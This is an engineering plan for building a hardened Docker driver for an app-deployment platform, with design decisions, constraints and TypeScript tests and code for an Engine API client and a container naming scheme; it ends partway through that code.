# P3 — Docker Driver and Deploy Spine Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the real Docker driver — the one that makes containers exist — so that a bare git repository becomes a running, routed, healthy application at a `manifest.internal` URL with the network off, and prove it by making that driver pass **the identical contract suite the fake driver passes**, plus a probe matrix (S6) that shows what a hostile process inside that container can actually reach.

**Architecture:** A `runtime/docker/` folder implementing §11's `Driver` against the Docker Engine API over its unix socket, with **no client library** — S1 established that the whole round-trip is ~40 lines of dependency-free code per operation. Everything §12 requires is a *value in a request body*, not a comment: the hardening baseline is a `HostConfig` literal, the network restriction is an `--internal` network, egress default-deny is a per-app forced proxy, and the builder is an ephemeral rootless BuildKit container destroyed in a `finally`. Around it sit three modules §5 names and P2 deliberately left empty — `build/` (source + spec → digest, with the platform-mandatory scan gates), `services/` (dedicated Mongo per app+environment, D3) and `routing/` (§23 hostnames, listener assignment, Caddy's JSON admin API). Tests run in **two tiers**: everything pure stays in `pnpm test` with no Docker, and everything that needs a daemon runs in `pnpm test:docker`, which **fails rather than skips** when it is supposed to run.

**Tech Stack:** TypeScript (strict), Node 24, pnpm workspaces, Vitest, the Docker Engine API **v1.44** over `/var/run/docker.sock`, rootless BuildKit v0.32.2 driven through `docker buildx` v0.36.1, `registry:2` (distribution 2.8.3) with bearer-token auth, Caddy 2.11.4's JSON admin API, `mongodb/mongodb-community-server:7.0.28-ubi8`, Syft v1.51.1 and Grype v0.118.0.

**Spec:** [`docs/superpowers/specs/2026-08-29-manifest-platform-design.md`](../specs/2026-08-29-manifest-platform-design.md) — §11 (execution model, the `Driver` interface), §12 in full (edge, DNS, egress, east-west, hardening, the builder, supply chain), §13 (digest binding, promotion, gate integrity), §16 (the driver contract suite and the security-regression tier), §20 (the control map), §21 (local topology and its honest divergences), §23 (the three zones).

**Roadmap:** [`2026-08-29-plan-roadmap.md`](./2026-08-29-plan-roadmap.md) — P3's scope, and gap 4, which makes **S6 this plan's acceptance exercise** rather than a spike that arrives too late to shape anything.

**Depends on:** **P1** for the substrate this plan drives (Caddy on `127.0.0.2` with its admin API on `127.0.0.1:7119`, the dual-homed registry on `127.0.0.1:7107`, Verdaccio, the internal build network, Postgres) and **P2** for the `Driver` interface, the contract suite, the state machine, `Config`/`hostnameFor`, `resolveConfig`, and the release records this plan gives digests to.

**Status: complete — 19 tasks, self-reviewed, and reconciled against a running P2.** No step in this plan stands in for a spike result. The two controls S1 left open were settled **before** it was written; see the next section. The self-review ran on 2026-09-04 and found seven defects, all fixed — *What the self-review caught*, near the end, records them.

**Reconciled 2026-09-05, after P2 executed in full.** This plan was written on
2026-08-31 against an *imagined* P2. P2 is now concrete and in several places
different, so every seam was checked — each place this plan modifies a file P2 built,
calls a P2 symbol, adds a sibling to a P2 error type, or asserts through P2's HTTP
surface. **Seven defects, all fixed inline with the measurement that found them.**
Two would have silently undone P2's own fixes, and one sat on the single assertion
this plan's self-review had already identified as its worst defect. They are listed
in *What the reconciliation found*, at the end.

**Deliberately not re-reviewed:** the Docker logic, §12's hardening, and S6's probe
matrix. This project has measured twice that reading a plan does not find what running
it finds — P2's self-review found 7 defects and executing it found 52. The
reconciliation was scoped to stale references to things that now exist, which is the
one class that *is* cheap to find on paper and expensive to hit at task 15 of 19.

---

## The two controls S1 left open, settled first

S1's *Open questions* assigned four things to P3 and the roadmap flagged two of them as
**controls rather than implementation details** — things a task must not merely assume.
Both were probed on 2026-08-31, inside a two-hour timebox, and the findings are
[`../spikes/S1-controls-settled.md`](../spikes/S1-controls-settled.md). Read it before
Tasks 9 and 10; everything below is written against its results.

| S1 left open | Settled |
|---|---|
| **A registry push token scoped to one repository path.** S1's registry had no auth at all, and §13's *"promotion never rebuilds"* rests on it. | **Works, no design change.** `registry:2` (2.8.3) does bearer-token auth against an issuer the control plane runs. Proved end to end through `docker push` **and** rootless BuildKit: the authorised repository accepts the push, the **same credential on another repository path is refused**, and the registry's storage holds only the authorised repository afterwards. Three non-obvious mechanics — the OAuth2 POST form grant, the client-side token exchange, and the over-broad scope ask — are Task 9's content. |
| **Builder timeout, disk quota, concurrency caps.** S1: *"the builder ran unbounded."* | **Three different mechanisms, and only two are BuildKit's.** `max-parallelism` serializes steps (measured: 2 builds in flight → 1, 25 s → 50 s). `maxUsedSpace` reclaims the cache after the fact (measured: 328 MB → 13.6 MB in ~20 s) but does **not** stop one build exceeding it. **There is no build timeout in BuildKit at all**, and **`--storage-opt size=` is accepted, recorded in `HostConfig`, and silently does nothing** on Docker Desktop's containerd snapshotter. Tasks 3 and 10. |
| **`exec()` was never exercised.** | Implemented here and smoke-tested only. **S5 owns the sandbox path**; nothing in this plan claims `exec` is proven. Decision 11. |
| **Multi-arch / image promotion, and whether `--internal` survives a Docker Desktop restart.** | Decisions 9 and 12 below. The first becomes an enforced refusal; the second becomes a check that runs every time rather than an answer recorded once. |

---

## Decisions this plan makes

Recorded here rather than left implicit, so a later reader sees the option chosen, the
options rejected, and what changing course would cost.

**1. The driver speaks the Engine API directly, with no client library.**
Every operation in §11 is one HTTP request over `/var/run/docker.sock`, and S1 drove
the entire round-trip — build, provision, route, health, log, stop, start, destroy —
from a dependency-free Node script. *Rejected:* `dockerode`, which adds a dependency
whose API surface is far wider than the ten calls we make, in the one component that
holds the Docker socket and is therefore the highest-value supply-chain target in the
system (§12 names build time as the most privileged moment; the driver is the other
one). *Cost of change:* `engine.ts` is the only file that would move; every caller
goes through its typed methods.

**2. Builds shell out to `docker buildx`, not to BuildKit's gRPC API.**
P1 Task 8 already verified `docker buildx create --driver remote
docker-container://manifest-buildkitd` attaches, and `--metadata-file` yields
`containerimage.digest` — S1's digest binding depends on it. Talking gRPC to buildkitd
would mean vendoring BuildKit's protobufs for one call. *Rejected:* the gRPC client,
and buildx's `docker-container` driver, which runs the rootless image inside a
`--privileged` container and so fails §12's baseline while appearing to satisfy
"rootless BuildKit" (S1). *Consequence, and it is a load-bearing one:* the buildx
**client** performs the registry token exchange (measured — see Task 9), so the token
issuer needs to be reachable from the control-plane host process and **not** from the
internal build network.

**3. The registry token issuer is a control-plane route, not a container.**
`GET/POST /internal/registry/token` on the control plane (port 7100) is the realm
`registry:2` advertises. This was measured rather than assumed: with the realm at an
address the builder **cannot** reach (`wget` from inside buildkitd: `Connection
refused`), the build still pushed, and the token request arrived from the host. So no
new container joins `manifest-build-internal`, and P1's compose file needs no new
service. *Rejected:* a dedicated `manifest-registry-auth` container dual-homed onto the
internal network — correct, but built to solve a problem that does not exist.
*Cost of change:* one route moves to a container; the JWT minting code is unchanged.

**4. `DriverCapabilities` gains `enforcesDiskQuota`, and `driver-contract.ts` is not touched.**
The probe found `--storage-opt size=` is accepted and does nothing, so §12's *"resource
ceilings including `pids` and disk"* is **half-true on this driver** — and
`InstanceSpec.resources.diskMi` therefore describes a ceiling nothing enforces. This is
the identical situation P2's Decision 3 handled for user-namespace remapping, so it
gets the identical treatment: declare it, do not imply it. **The shared contract suite
stays byte-for-byte as P2 wrote it** — that is what makes it a contract — so the drift
protection lives in P3's own test as a `Record<keyof DriverCapabilities, true>` literal,
which fails to *compile* if the interface grows a field the Docker driver does not
report. Task 3. *Files that change in P2's island:* `runtime/driver.ts` (one field) and
`runtime/fake-driver.ts` (its default). **Not `runtime/driver-contract.ts`.**

**5. Each app+environment gets its own egress proxy, not a shared allowlist.**
§12 makes egress *"deny by default: a platform baseline plus whatever the app declares
in `egress.allow`"*. tinyproxy's filter file is per-process, so a single shared proxy
can only hold the **union** of every app's allowlist — which silently grants app A
every destination app B declared, and destroys the property §12 is actually buying
(*"an app that suddenly needs a new outbound destination is a signal, not a
convenience"*). The driver therefore creates one `mf-<slug>-<env>-egress` tinyproxy
alongside each app, rendering `platform baseline ∪ spec.egress.allow` into its own
filter. *Rejected:* the shared union, which is cheaper and weaker in the one control
Phase 1 calls non-negotiable. *Cost:* one ~3 MB container per app environment, against
§21's ~0.5 GB per-environment budget. P1's `manifest-egress` keeps its job — the
platform baseline for platform components, and `make verify`'s negative control.

**6. `build/` becomes a real module, discharging P2's Decision 6.**
P2 kept build records in `releases/build.ts` because *"a build exists only to become a
release"*, and said outright that **P3 adds the real builder and may take the split
then**. It takes it. `build/` owns source → context → gates → digest; `releases/` keeps
the record. The two are separated by a fact rather than a preference: the gates in
`build/` are platform-mandatory and **cannot be waived by an app** (§12), so they must
not sit in a module whose job is to serve an app's release request.

**7. The Docker test tier fails rather than skips when it is meant to run.**
`pnpm test` stays Docker-free and millisecond-fast — that is §16's highest-leverage
property and P2 cashed it in. Docker-requiring suites live in `pnpm test:docker`.
A suite that silently skips is how a control stops being checked without anyone
noticing, so the tier reads `MANIFEST_TEST_DOCKER`: **unset → skip with a printed
reason; set to `1` with Docker unreachable → the suite fails.** `make verify` sets it.
*Rejected:* `describe.skipIf(dockerAvailable)`, which is the same code with the failure
mode removed.

**8. Readiness is polled through the edge, never at the container address.**
S1: *"A host process cannot reach container IPs on Docker Desktop"* — `host →
10.89.0.2:8080 = UNREACHABLE` — and §21 now says so. The control plane is a host
process, so `ensureInstance` waits on `https://<slug>.<zone>{healthPath}` through
Caddy. **This makes routing a prerequisite of health, not a step after it**, which
inverts the obvious ordering and is why it is Task 14 rather than a line inside Task 7.

**9. Laptop images live in a `local/` namespace, and a remote-target driver refuses them.**
S1's open question — *"nothing in the driver enforces it yet"*. §13 scopes the rule to
the **driver**, not the environment kind: everything this driver builds is
`local/<slug>`, and `assertPromotable()` refuses to deploy a `local/` image on any
driver whose `capabilities().remoteTarget` is `true`. It is enforced against the **fake
driver** in the Docker-free tier, by flipping one capability flag — so the rule that
protects UBC infrastructure is tested on a laptop that has no UBC infrastructure.
Task 16.

**10. The build timeout is enforced by destroying the builder, with a client deadline in front of it.**
BuildKit has no build timeout — not in `buildkitd.toml`, not as a buildx flag — so the
only cancellation is the client's, over a gRPC session that dies with the client. A
control plane that crashes mid-build cancels nothing. Since §12 already makes the
builder **ephemeral per build**, the timeout is `docker rm -f` on that builder in a
`finally`, and the client deadline is the fast path that usually gets there first.
The probe also found a cancelled build that left its `RUN` process alive for minutes
while later identical builds **attached to that dead solve** rather than starting their
own — not reproducible, but it is the failure this design is immune to by construction.

**11. `exec()` is implemented and smoke-tested; the sandbox path is S5's.**
`capabilities().supportsExec` is `true` because the operation genuinely works, and
Task 8 proves it against a real container. **Nothing here claims the sandbox use of it
is proven** — S1 never exercised it and S5 exists to. A driver that reported
`supportsExec: false` would be lying in the other direction.

**12. "Does `--internal` survive a Docker Desktop restart?" becomes a check, not an answer.**
S1 left it open and the roadmap suggested `make doctor` could assert it. Answering it
once is worth little — Docker Desktop upgrades. Task 19 adds it to `make verify` as a
negative control that runs on every invocation, which answers it continuously and
turns a regression into a failed check rather than a leaked builder.

---

## Global Constraints

Every task's requirements implicitly include this section. Values are copied verbatim
from the spec or from a findings note.

- **Node 24**, TypeScript `strict: true`, **no `any` in committed code** — use `unknown` and narrow.
- **No module reaches into another module's internals** (§5). Imports cross module boundaries only through `src/<module>/index.ts` or `src/<module>/testing.ts`. Enforced by ESLint *and* by P2 Task 1's boundary test, which resolves each import and compares modules — subdirectories inside a module (`runtime/docker/`) stay legal.
- **`packages/control-plane/src/runtime/driver-contract.ts` is imported unchanged.** If a change to it seems necessary, that is a finding about the interface, not a licence to edit the suite. Say so and stop.
- **Green before every commit — FOUR gates, not three:** `pnpm test` (**from the repo root**, not `pnpm --filter … test`; the two set a different working directory and that difference was a P2 defect), `pnpm lint`, `pnpm --filter @manifest/control-plane typecheck`, and `pnpm format:check`. `pnpm test` must stay Docker-free, and must be **run twice** — a suite that is not repeatable has a state leak, which is how five of P2's defects surfaced.

  *Corrected 2026-09-05 after P2 executed. This plan named three gates and never mentioned `format:check` at all, which was silently red on 29 files of P2's own code. And `typecheck` is not a formality after the tests: **Vitest strips types without checking them**, so a file can pass every test it has while `tsc` reports four errors — that happened six times in P2.*
- **Naming:** platform containers are `manifest-<service>` (P1's). Everything this plan creates is `mf-<slug>-<env>[-<suffix>]` for containers, networks and volumes, and nothing outside those two prefixes may be named, inspected destructively, or removed.
- **Never `--privileged`**, on any container, including the builder (§12, S1).
- **The container runtime socket is never mounted into a workload container** (§12). The reference compose at `/Users/rich/Developer/coder.com/docker-compose.yml` does exactly this and is the named counter-example.
- **Everything binds `127.0.0.1` explicitly.** Never `localhost` — S1 lost time to `docker push localhost:7107/…` resolving to `::1` and timing out.
- **`PUT` on `/config/apps/http/servers/srv0/routes/0`, never `POST`** — `POST` appends, landing the route behind the wildcard whose `terminal: true` swallows it (S7, S1).
- **Images are addressed by digest, never by tag**, once built (§13). `containerimage.digest` from `--metadata-file` is the only source.
- **Hostnames are `<slug>.<zone for that environment kind>`** (§23). Three zone settings, from `Config`. The slug — already validated `^[a-z][a-z0-9-]{2,38}$` — is the only app-supplied part. **Never a suffix on the label.**
- **The §12 hardening baseline, exactly as S1 measured it:** `CapDrop: ["ALL"]`, `SecurityOpt: ["no-new-privileges"]`, `ReadonlyRootfs: true`, an explicit `/tmp` tmpfs, `PidsLimit`, `Memory`, `NanoCpus`, `Privileged: false`. Two items on this driver do **not** enforce and are reported through `capabilities()`: user-namespace remapping and disk quota.
- **Dependency and secret scanning are platform-mandatory build gates** and cannot be waived by an app (§12). Vulnerability scanning **warns rather than blocks** when its database is older than 7 days, and the staleness is recorded on the Release.
- **Errors are machine-actionable** (§20, D23.7): a stable `code` and a `hint` beside every human `message`.
- **macOS ships bash 3.2 and a BSD userland.** No `mapfile`, no `xargs -r`, no `readlink -f`, no GNU-only flags in anything under `scripts/` or `infra/`.
- **Ports:** 7100 control plane · 7103 Postgres · 7106 LiteLLM · 7107 registry · 7108 Verdaccio · 7109 platform egress proxy · 7119 Caddy admin · 7122 IdP · 7153 dnsmasq. Per-app ports are never published.
- **Never commit a secret**, and never log one.
- **Commit after every task.** Conventional commit messages (`feat:`, `test:`, `chore:`).

---

## File Structure

```
manifest/
├── infra/
│   ├── compose.yaml                        MODIFIED: registry gains token auth
│   ├── images.txt                          MODIFIED: + mongo, syft, grype
│   ├── registry-auth/                      gitignored; `make seed` writes both
│   │   ├── token.key                       the issuer's private key (control plane reads)
│   │   └── token.crt                       the cert registry:2 validates against
│   ├── seed/
│   │   ├── seed.sh                         MODIFIED: generate the issuer keypair
│   │   ├── mint-token.mjs                  NEW: seed's own scoped push token
│   │   └── mirror-images.sh                MODIFIED: push base images WITH a token
│   └── scanner/
│       └── grype.yaml                      offline DB config, staleness reporting
├── fixtures/
│   └── fixture-app/                        P3's build target: health + one Mongo write
│       ├── package.json
│       ├── package-lock.json               committed — §12 requires it, the build fails without
│       └── src/index.js
├── scripts/
│   ├── doctor.sh                           MODIFIED: scanner DB age (§12)
│   ├── verify.sh                           MODIFIED: --internal survival, mf- cleanliness
│   └── demo.sh                             NEW: the P3 demo (Task 17)
└── packages/control-plane/src/
    ├── runtime/
    │   ├── driver.ts                       MODIFIED: + enforcesDiskQuota
    │   ├── fake-driver.ts                  MODIFIED: reports the new field
    │   ├── driver-contract.ts              UNCHANGED. Do not edit this file.
    │   └── docker/
    │       ├── engine.ts                   Engine API over the unix socket, no deps
    │       ├── names.ts                    the mf- naming scheme
    │       ├── docker-tier.ts              describeDocker(): fail, don't skip
    │       ├── hardening.ts                §12's HostConfig + capability detection
    │       ├── networks.ts                 per-app networks, east-west denials
    │       ├── egress.ts                   the per-app forced proxy (Decision 5)
    │       ├── services.ts                 Mongo per app+environment (D3)
    │       ├── instances.ts                ensure / stop / destroy / status
    │       ├── logs.ts                     the 8-byte frame demux
    │       ├── exec.ts                     exec (S5 exercises the sandbox path)
    │       ├── registry-auth.ts            the scoped JWT issuer
    │       ├── builder.ts                  ephemeral rootless BuildKit + its bounds
    │       ├── driver.ts                   DockerDriver, assembled
    │       └── index.ts
    ├── build/                              NEW MODULE (Decision 6)
    │   ├── context.ts                      bare repo @ commit + blueprint -> context dir
    │   ├── gates.ts                         secret scan + lockfile: offline, never degrade
    │   ├── scan.ts                          SBOM + vulnerability scan + DB staleness
    │   ├── build.ts                         the orchestration
    │   └── index.ts
    ├── services/                           NEW MODULE
    │   ├── catalogue.ts                    platform-owned, platform-pinned images (§20)
    │   ├── bindings.ts                     a declared service -> its full §8 variable set
    │   └── index.ts
    ├── routing/                            NEW MODULE
    │   ├── hostnames.ts                    §23 derivation + listener assignment
    │   ├── caddy.ts                        the JSON admin API client
    │   ├── routes.ts                       apply / remove / reapply-on-edge-restart
    │   └── index.ts
    ├── releases/
    │   └── promotion.ts                    NEW: §13's local/ + remoteTarget refusal
    └── api/routes/
        └── registry-token.ts               NEW: the realm registry:2 points at
```

**Where the tests live.** `*.test.ts` beside its subject, as P2 established. Docker-tier
suites are named `*.docker.test.ts` so the two vitest projects can select on filename
rather than on a convention someone has to remember.

---

## Task 1: The Engine API client, and the `mf-` naming scheme

**Files:**
- Create: `packages/control-plane/src/runtime/docker/engine.ts`
- Create: `packages/control-plane/src/runtime/docker/names.ts`
- Test: `packages/control-plane/src/runtime/docker/engine.test.ts`
- Test: `packages/control-plane/src/runtime/docker/names.test.ts`

**Interfaces:**
- Consumes: nothing. This is the bottom of the stack.
- Produces:
  - `interface EngineClient` — `get`, `post`, `del`, `postRaw`, `stream`
  - `createEngineClient(opts: { socketPath: string; apiVersion?: string }): EngineClient`
  - `resolveSocketPath(env?: NodeJS.ProcessEnv): string`
  - `class EngineError extends Error` with `code`, `status`, `hint`
  - `API_VERSION = 'v1.44'`
  - `assertApiVersionSupported(client): Promise<void>`
  - `appContainer/serviceContainer/egressContainer/appNetwork/serviceVolume(slug, kind, …): string`
  - `MF_PREFIX = 'mf-'`, `isManifestOwned(name: string): boolean`

**Why there is no Docker library here.** See *Decisions*, item 1. The whole of §11 is
ten HTTP calls, and this is the process holding the Docker socket.

**The socket path is discovered, not assumed.** On this machine
`/var/run/docker.sock` is a **symlink** to `~/.docker/run/docker.sock`, and that
symlink exists only because Docker Desktop's *"Allow the default Docker socket to be
used"* is on. It is off by default for some installs, so a hardcoded
`/var/run/docker.sock` produces `ENOENT` on a machine where `docker ps` works
perfectly — the most confusing possible failure. Resolution order: `DOCKER_HOST`
(`unix://` only), then `MANIFEST_DOCKER_SOCKET`, then `~/.docker/run/docker.sock`,
then `/var/run/docker.sock`.

**The API version is pinned low and then checked.** Everything this driver uses —
container create with a full `HostConfig`, networks, volumes, exec, the framed log
stream — has existed since API 1.25. Pinning `v1.44` (Docker 25.0) rather than this
machine's `1.55` maximises the range of daemons that work, and
`assertApiVersionSupported` reads `/version` at boot and fails with a named code if
the pin falls outside the daemon's `[MinAPIVersion, ApiVersion]` window. A pin that
is never checked is a 400 arriving three tasks later with no explanation.

- [ ] **Step 1: Write the failing tests**

`packages/control-plane/src/runtime/docker/names.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { instanceName, serviceName } from '../driver.js'
import {
  MF_PREFIX, appContainer, appNetwork, egressContainer, isManifestOwned,
  serviceContainer, serviceVolume,
} from './names.js'

// A real release id. Task 8 of P2 makes it `uuid().defaultRandom()`, so the first
// eight characters `instanceName` keeps are eight random hex digits — which is why
// truncating from the front is safe here and would not be for a prefixed id scheme.
const RELEASE = '9f1c4d2e-7a3b-4c5d-8e6f-0a1b2c3d4e5f'

describe('mf- naming (§11 determinism, P1 ownership rule)', () => {
  it('prefixes the names the Driver interface already derived', () => {
    expect(appContainer(instanceName('chem-labs', 'staging', RELEASE))).toBe(
      'mf-chem-labs-staging-9f1c4d2e-app',
    )
    expect(serviceContainer(serviceName('chem-labs', 'staging', 'db'))).toBe(
      'mf-chem-labs-staging-db',
    )
    expect(serviceVolume(serviceName('chem-labs', 'staging', 'db'))).toBe(
      'mf-chem-labs-staging-db-data',
    )
    expect(appNetwork('chem-labs', 'staging')).toBe('mf-chem-labs-staging-net')
    expect(egressContainer('chem-labs', 'staging')).toBe('mf-chem-labs-staging-egress')
  })

  it('is stable across calls and distinct across environments', () => {
    const a = appContainer(instanceName('chem-labs', 'staging', RELEASE))
    expect(appContainer(instanceName('chem-labs', 'staging', RELEASE))).toBe(a)
    expect(appContainer(instanceName('chem-labs', 'production', RELEASE))).not.toBe(a)
  })

  // A service outlives a release (D3: its data survives redeploys), so its name
  // must NOT carry one. An instance is per release, so its name must.
  it('keeps services release-independent and instances release-dependent', () => {
    const other = '1a2b3c4d-0000-0000-0000-000000000000'
    expect(appContainer(instanceName('chem-labs', 'staging', RELEASE))).not.toBe(
      appContainer(instanceName('chem-labs', 'staging', other)),
    )
    expect(serviceContainer(serviceName('chem-labs', 'staging', 'db'))).toBe(
      serviceContainer(serviceName('chem-labs', 'staging', 'db')),
    )
  })

  // P1's ownership rule, restated as code: nothing outside manifest-* and mf-* is
  // ever removed. These four names are real containers on the author's machine.
  it("recognises only mf- names as this driver's to destroy", () => {
    expect(MF_PREFIX).toBe('mf-')
    expect(isManifestOwned('mf-chem-labs-staging-9f1c4d2e-app')).toBe(true)
    expect(isManifestOwned('manifest-registry')).toBe(false)
    expect(isManifestOwned('docker-simple-saml-saml-idp-1')).toBe(false)
    expect(isManifestOwned('mongodb')).toBe(false)
  })
})
```

`packages/control-plane/src/runtime/docker/engine.test.ts` — **a real unix socket, no
Docker**:

```ts
import { createServer, type Server } from 'node:http'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { EngineError, assertApiVersionSupported, createEngineClient, resolveSocketPath } from './engine.js'

let server: Server | undefined
let dir: string | undefined

/** A stand-in daemon on a unix socket. Exercises the transport with no Docker. */
function fakeDaemon(handler: (path: string, method: string) => { status: number; body: unknown }) {
  dir = mkdtempSync(join(tmpdir(), 'mf-engine-'))
  const socketPath = join(dir, 'docker.sock')
  server = createServer((req, res) => {
    const { status, body } = handler(req.url ?? '', req.method ?? 'GET')
    res.writeHead(status, { 'content-type': 'application/json' })
    res.end(JSON.stringify(body))
  })
  return new Promise<string>((resolve) => server!.listen(socketPath, () => resolve(socketPath)))
}

afterEach(() => {
  server?.close()
  if (dir) rmSync(dir, { recursive: true, force: true })
  server = undefined
  dir = undefined
})

describe('the Engine API client', () => {
  it('prefixes the pinned API version and parses JSON', async () => {
    const seen: string[] = []
    const socketPath = await fakeDaemon((path) => {
      seen.push(path)
      return { status: 200, body: { Id: 'abc123' } }
    })
    const engine = createEngineClient({ socketPath })
    expect(await engine.get<{ Id: string }>('/containers/abc/json')).toEqual({ Id: 'abc123' })
    expect(seen[0]).toBe('/v1.44/containers/abc/json')
  })

  it('turns a daemon error into a machine-actionable EngineError', async () => {
    const socketPath = await fakeDaemon(() => ({
      status: 409,
      body: { message: 'Conflict. The container name is already in use' },
    }))
    const engine = createEngineClient({ socketPath })
    await expect(engine.post('/containers/create', {})).rejects.toThrow(EngineError)
    try {
      await engine.post('/containers/create', {})
    } catch (error) {
      expect((error as EngineError).code).toBe('DOCKER_ENGINE_ERROR')
      expect((error as EngineError).status).toBe(409)
      expect((error as EngineError).message).toContain('already in use')
      expect((error as EngineError).hint).toBeTruthy()
    }
  })

  // 404 is not an error for this driver: destroy is idempotent (§11), so the
  // caller decides. Returning undefined is what lets destroyInstance swallow it
  // without string-matching an exception message.
  it('returns undefined for 404 rather than throwing', async () => {
    const socketPath = await fakeDaemon(() => ({ status: 404, body: { message: 'no such container' } }))
    const engine = createEngineClient({ socketPath })
    expect(await engine.get('/containers/nope/json')).toBeUndefined()
    expect(await engine.del('/containers/nope')).toBeUndefined()
  })

  it('refuses a daemon whose API window does not contain the pin', async () => {
    const socketPath = await fakeDaemon(() => ({
      status: 200,
      body: { ApiVersion: '1.39', MinAPIVersion: '1.24', Version: '18.09.0' },
    }))
    const engine = createEngineClient({ socketPath })
    await expect(assertApiVersionSupported(engine)).rejects.toThrow(EngineError)
    try {
      await assertApiVersionSupported(engine)
    } catch (error) {
      expect((error as EngineError).code).toBe('DOCKER_API_VERSION_UNSUPPORTED')
    }
  })

  it('accepts a daemon whose window contains the pin', async () => {
    const socketPath = await fakeDaemon(() => ({
      status: 200,
      body: { ApiVersion: '1.55', MinAPIVersion: '1.40', Version: '29.7.2' },
    }))
    await expect(assertApiVersionSupported(createEngineClient({ socketPath }))).resolves.toBeUndefined()
  })

  // Digit-concatenation would compare 1100 against 155 here and reject a daemon
  // that supports the pin. Two-part comparison is the only version of this that
  // survives Docker shipping API 1.100.
  it('compares versions as (major, minor), not as concatenated digits', async () => {
    const socketPath = await fakeDaemon(() => ({
      status: 200,
      body: { ApiVersion: '1.100', MinAPIVersion: '1.40', Version: '99.0.0' },
    }))
    await expect(assertApiVersionSupported(createEngineClient({ socketPath }))).resolves.toBeUndefined()
  })
})

describe('socket discovery', () => {
  it('prefers DOCKER_HOST when it is a unix socket', () => {
    expect(resolveSocketPath({ DOCKER_HOST: 'unix:///custom/docker.sock' })).toBe('/custom/docker.sock')
  })

  // A TCP DOCKER_HOST is not a socket path. Silently falling back to the default
  // would talk to a DIFFERENT daemon than `docker` does — the driver would create
  // containers the developer cannot see.
  it('refuses a non-unix DOCKER_HOST rather than falling back', () => {
    expect(() => resolveSocketPath({ DOCKER_HOST: 'tcp://10.0.0.5:2376' })).toThrow(EngineError)
  })

  it('honours MANIFEST_DOCKER_SOCKET when DOCKER_HOST is unset', () => {
    expect(resolveSocketPath({ MANIFEST_DOCKER_SOCKET: '/a/b.sock' })).toBe('/a/b.sock')
  })
})
```

- [ ] **Step 2: Run them to make sure they fail**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/
```

Expected: FAIL — `Cannot find module './names.js'` and `'./engine.js'`.

- [ ] **Step 3: Write the naming scheme**

`packages/control-plane/src/runtime/docker/names.ts`:

```ts
/**
 * Every Docker object this driver creates carries this prefix, and nothing without
 * it is ever removed. P1's constraint, restated as code: `manifest-*` is the
 * platform's, `mf-*` is per-app and ours, and everything else on the developer's
 * machine is somebody else's.
 */
import type { InstanceSpec } from '../driver.js'

export const MF_PREFIX = 'mf-'

/**
 * NOT redefined here, for the reason `routing/hostnames.ts` gives at Task 13: a
 * literal second copy of this union is a second thing to keep in step with
 * `InstanceSpec`, and the drift would be silent. Four modules import this one
 * (Tasks 4, 5 and 6), so it is the copy that would do the damage.
 */
export type EnvironmentKind = InstanceSpec['environmentKind']

/**
 * The Docker name is the interface's deterministic name with our prefix on it.
 * Re-deriving it from (slug, kind, release) here would create a SECOND derivation
 * that has to agree with `instanceName` forever, and the contract's "the second
 * call returns the same handle" would then depend on two functions staying in
 * step rather than on one function being deterministic.
 */
export function appContainer(instance: string): string {
  return `${MF_PREFIX}${instance}-app`
}

/** A service outlives releases (D3), so its name carries no release id. */
export function serviceContainer(service: string): string {
  return `${MF_PREFIX}${service}`
}

export function serviceVolume(service: string): string {
  return `${serviceContainer(service)}-data`
}

export function appNetwork(slug: string, kind: EnvironmentKind): string {
  return `${MF_PREFIX}${slug}-${kind}-net`
}

export function egressContainer(slug: string, kind: EnvironmentKind): string {
  return `${MF_PREFIX}${slug}-${kind}-egress`
}

export function isManifestOwned(name: string): boolean {
  return name.startsWith(MF_PREFIX)
}
```

Re-exported from `runtime/docker/index.ts` alongside everything else this folder
produces; `instanceName` and `serviceName` come from `../driver.js`, which is inside
the same module, so no boundary is crossed.

- [ ] **Step 4: Write the Engine client**

`packages/control-plane/src/runtime/docker/engine.ts`:

```ts
import { existsSync } from 'node:fs'
import { request as httpRequest, type IncomingMessage } from 'node:http'
import { homedir } from 'node:os'
import { join } from 'node:path'

/**
 * Pinned low on purpose. Every call this driver makes has existed since API 1.25;
 * 1.44 is Docker 25.0, comfortably inside this machine's [1.40, 1.55] window and
 * inside far older daemons' too. `assertApiVersionSupported` checks it at boot.
 */
export const API_VERSION = 'v1.44'

export class EngineError extends Error {
  constructor(
    readonly code: string,
    message: string,
    readonly hint: string,
    readonly status?: number,
  ) {
    super(message)
    this.name = 'EngineError'
  }
}

/**
 * The socket is discovered, never assumed. `/var/run/docker.sock` is a SYMLINK to
 * `~/.docker/run/docker.sock` on Docker Desktop, and it exists only when "Allow the
 * default Docker socket to be used" is enabled — off by default on some installs.
 * Hardcoding it yields ENOENT on a machine where `docker ps` works fine.
 */
export function resolveSocketPath(env: NodeJS.ProcessEnv = process.env): string {
  const host = env.DOCKER_HOST
  if (host !== undefined && host !== '') {
    if (!host.startsWith('unix://')) {
      throw new EngineError(
        'DOCKER_HOST_NOT_A_SOCKET',
        `DOCKER_HOST is '${host}', which is not a unix socket.`,
        'This driver holds a unix socket. Unset DOCKER_HOST, or point it at a unix:// path. ' +
          'Falling back to the default socket would talk to a different daemon than `docker` does.',
      )
    }
    return host.slice('unix://'.length)
  }
  if (env.MANIFEST_DOCKER_SOCKET) return env.MANIFEST_DOCKER_SOCKET
  // Docker Desktop's own socket first, then the classic path. Checked rather than
  // guessed, because `/var/run/docker.sock` is a symlink that exists only when
  // "Allow the default Docker socket to be used" is enabled.
  const desktop = join(env.HOME ?? homedir(), '.docker', 'run', 'docker.sock')
  return existsSync(desktop) ? desktop : '/var/run/docker.sock'
}

export interface EngineClient {
  get<T>(path: string): Promise<T | undefined>
  post<T>(path: string, body?: unknown): Promise<T | undefined>
  del<T>(path: string): Promise<T | undefined>
  /** For endpoints that answer with a raw byte stream: logs, exec, attach. */
  stream(path: string, method?: 'GET' | 'POST', body?: unknown): Promise<IncomingMessage>
}

export function createEngineClient(opts: {
  socketPath: string
  apiVersion?: string
}): EngineClient {
  const version = opts.apiVersion ?? API_VERSION

  const send = (method: string, path: string, body?: unknown): Promise<IncomingMessage> =>
    new Promise((resolve, reject) => {
